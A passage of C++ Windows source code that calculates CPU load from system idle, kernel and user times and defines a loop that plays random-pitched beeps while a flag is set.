    static unsigned long long _previousTotalTicks = 0;
    static unsigned long long _previousIdleTicks = 0;
    unsigned long long totalTicksSinceLastTime = totalTicks - _previousTotalTicks;
    unsigned long long idleTicksSinceLastTime = idleTicks - _previousIdleTicks;
    float ret = 1.0f - ((totalTicksSinceLastTime > 0) ? ((float)idleTicksSinceLastTime) / totalTicksSinceLastTime : 0);
    _previousTotalTicks = totalTicks;
    _previousIdleTicks = idleTicks;
    return ret;
}

static unsigned long long FileTimeToInt64(const FILETIME & ft)
{
    return (((unsigned long long)(ft.dwHighDateTime)) << 32) | ((unsigned long long)ft.dwLowDateTime);
}

float GetCPULoad()
{
    FILETIME idleTime, kernelTime, userTime;
    return GetSystemTimes(&idleTime, &kernelTime, &userTime) ? CalculateCPULoad(FileTimeToInt64(idleTime), FileTimeToInt64(kernelTime) + FileTimeToInt64(userTime)) : -1.0f;
}

void Rbeep()
{
	srand(time(0));
	while(v10)
	{
		Beep(rand()%1000+100,100);
	}
	
	return;
}
